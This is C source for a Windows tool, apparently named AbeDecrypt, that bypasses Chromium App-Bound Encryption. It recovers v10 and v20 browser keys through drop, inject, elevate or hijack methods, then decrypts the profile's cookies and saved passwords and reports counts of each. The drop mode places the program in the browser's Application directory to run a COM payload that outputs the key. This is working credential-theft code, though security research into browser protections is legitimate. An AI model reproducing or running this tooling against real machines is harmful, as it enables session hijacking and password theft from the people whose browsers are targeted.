#include "AbeDecrypt.h"

/*** worker thread ***/

static const PCSTR DbFiles[] = { "Login Data", "Login Data For Account" };

PABE_RESULT g_AbeResult;

DWORD WINAPI
AbeWorker(
    _In_ LPVOID Parameter)
{
    PABE_JOB Job = Parameter;
    PABE_RESULT Result = Job->Result;
    BYTE V10Key[ABE_KEY_SIZE], V20Key[ABE_KEY_SIZE];
    ULONG V20Envelope = 0, i;
    BOOL HaveV10, HaveV20;
    HRESULT RoHr;
    ULONGLONG TotalStep, Step;

    RtlZeroMemory(Result, sizeof(*Result));
    g_AbeResult = Result;
    TotalStep = AbeStepStart();
    Step = AbeStepStart();
    RoHr = RoInitialize(RO_INIT_MULTITHREADED);
    AbeLogStepHr(L"Worker", L"RoInitialize", RoHr, Step);
    if (FAILED(RoHr))
    {
        /* Local State parsing uses WinRT JSON */
        PostMessageW(g_MainWindow, ABE_WM_RESULT, 0, (LPARAM)Result);
        g_AbeResult = NULL;
        Mem_Free(Job);
        return 0;
    }

    Step = AbeStepStart();
    HaveV10 = AbeGetV10Key(&Job->Browser, V10Key);
    AbeLogStepBool(L"Worker", L"get v10 key", HaveV10, Step);
    AbeLog(L"v10 key (DPAPI): %ls\r\n", HaveV10 ? L"OK" : L"failed");

    Step = AbeStepStart();
    switch (Job->Method)
    {
        case MethodDrop:
            HaveV20 = AbeGetKeyDrop(&Job->Browser, V20Key);
            break;
        case MethodInject:
            HaveV20 = AbeGetKeyInject(&Job->Browser, V20Key);
            break;
        case MethodElevate:
            HaveV20 = AbeGetKeyElevate(&Job->Browser, V20Key, &V20Envelope);
            break;
        default:
            HaveV20 = AbeGetKeyHijack(&Job->Browser, V20Key);
            break;
    }
    AbeLogStepBool(AbeMethodNames[Job->Method], L"method complete", HaveV20, Step);
    if (Job->Method == MethodElevate && V20Envelope != 0)
    {
        AbeLog(L"v20 private envelope version: v%lu\r\n", V20Envelope);
    }
    AbeLog(L"v20 key (%ls): %ls\r\n", AbeMethodNames[Job->Method], HaveV20 ? L"OK" : L"failed");
    if (HaveV10)
    {
        AbeLogKey(L"V10", V10Key);
    }
    if (HaveV20)
    {
        AbeLogKey(L"V20", V20Key);
    }

    if (HaveV10 || HaveV20)
    {
        const BYTE* V10 = HaveV10 ? V10Key : NULL;
        const BYTE* V20 = HaveV20 ? V20Key : NULL;

        Step = AbeStepStart();
        AbeCollectRecords(&Job->Browser,
                          Job->Profile,
                          "Network\\Cookies",
                          TRUE,
                          V10,
                          V20,
                          V20Envelope,
                          FALSE,
                          Result);
        AbeLog(L"Worker: collect cookies finished (%I64ums)\r\n", AbeStepMs(Step));
        for (i = 0; i < ARRAYSIZE(DbFiles); i++)
        {
            /* the account store may hold additional signed-in passwords */
            Step = AbeStepStart();
            AbeCollectRecords(&Job->Browser,
                              Job->Profile,
                              DbFiles[i],
                              FALSE,
                              V10,
                              V20,
                              V20Envelope,
                              i != 0,
                              Result);
            AbeLog(L"Worker: collect %hs finished (%I64ums)\r\n",
                   DbFiles[i],
                   AbeStepMs(Step));
        }
    }

    Result->Ok = HaveV20 || HaveV10;
    AbeLogStepBool(L"Worker", L"total decrypt run", Result->Ok, TotalStep);
    if (Result->Ok)
    {
        Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), L"\r\nDone: cookies ");
        {
            WCHAR Number[16];

            Str_PrintfExW(Number, ARRAYSIZE(Number), L"%lu", Result->CookieCount);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Number);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), L", passwords ");
            Str_PrintfExW(Number, ARRAYSIZE(Number), L"%lu", Result->PasswordCount);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Number);
        }
    }

    RtlSecureZeroMemory(V10Key, sizeof(V10Key));
    RtlSecureZeroMemory(V20Key, sizeof(V20Key));
    RoUninitialize();
    g_AbeResult = NULL;
    PostMessageW(g_MainWindow, ABE_WM_RESULT, 0, (LPARAM)Result);
    Mem_Free(Job);
    return 0;
}

/*** Drop child detection: our exe resides inside a browser Application directory
    and the command line carries the Drop marker ***/

static BOOL
AbeIsDropChild(
    _Out_ PNET_BROWSER_INFO Browser)
{
    PCWSTR Cmd = NtCurrentPeb()->ProcessParameters->CommandLine.Buffer;
    PNET_BROWSER_INFO List;
    WCHAR Self[MAX_PATH], Dir[MAX_PATH];
    ULONG Count, i, Length;
    BOOL Found = FALSE;

    if (Cmd == NULL || Str_StrIW(Cmd, L"Drop") == NULL ||
        !NT_CopyStringW(&NtCurrentPeb()->ProcessParameters->ImagePathName, Self, MAX_PATH))
    {
        return FALSE;
    }
    if (!NT_SUCCESS(Net_BrowserEnumerate(&List, &Count)))
    {
        return FALSE;
    }
    /* our directory must be the browser's Application directory (= ExePath's) */
    for (i = 0; i < Count && !Found; i++)
    {
        Length = (ULONG)(wcsrchr(List[i].ExePath, L'\\') - List[i].ExePath);
        if (Length >= MAX_PATH)
        {
            continue;
        }
        RtlCopyMemory(Dir, List[i].ExePath, Length * sizeof(WCHAR));
        Dir[Length] = L'\\';
        Dir[Length + 1] = UNICODE_NULL;
        if (Str_StrIW(Self, Dir) == Self)
        {
            *Browser = List[i];
            Found = TRUE;
        }
    }
    Mem_Free(List);
    return Found;
}

int
APIENTRY
wWinMain(
    _In_ HINSTANCE Instance,
    _In_opt_ HINSTANCE PreviousInstance,
    _In_ PWSTR CommandLine,
    _In_ int ShowCmd)
{
    UNREFERENCED_PARAMETER(PreviousInstance);
    UNREFERENCED_PARAMETER(CommandLine);

    /* Drop child: no window, run the COM payload and report the key on stdout */
    {
        NET_BROWSER_INFO ChildBrowser;

        if (AbeIsDropChild(&ChildBrowser) && ChildBrowser.Type < NetBrowserMax)
        {
            return AbeDropChild(&ChildBrowser) ? 0 : 1;
        }
    }

    InitCommonControlsEx(&(INITCOMMONCONTROLSEX){ sizeof(INITCOMMONCONTROLSEX),
                         ICC_LISTVIEW_CLASSES | ICC_STANDARD_CLASSES });

    g_MainWindow = CreateDialogParamW(Instance,
                                      MAKEINTRESOURCEW(IDD_MAIN),
                                      NULL,
                                      AbeDialogProc,
                                      0);
    if (g_MainWindow == NULL)
    {
        return 1;
    }
    ShowWindow(g_MainWindow, ShowCmd);
    UI_MessageLoop(NULL, TRUE, NULL, NULL);

    Mem_Free(g_Browsers);
    return 0;
}
